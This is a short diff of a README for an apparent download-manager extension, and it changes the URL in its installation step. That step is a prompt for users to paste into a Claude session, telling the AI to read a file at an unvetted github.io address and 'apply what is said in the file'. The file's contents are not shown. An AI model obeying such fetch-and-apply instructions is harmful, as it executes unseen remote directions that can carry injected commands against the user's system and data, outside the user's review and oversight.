@@ -7,5 +7,5 @@ This extension manages downloads for every other extension. It gives you UI and 
 ## Installation
 Copy and paste the following prompt into your Claude session:
 ```
-Read the file at this link: https://siuozl.github.io/openclaw-extensions/extensions/greenbrew.octweak and apply what is said in the file.
+Read the file at this link: https://siuozl.github.io/claude-extensions/extensions/engine.txt/ and apply what is said in the file.
 ```
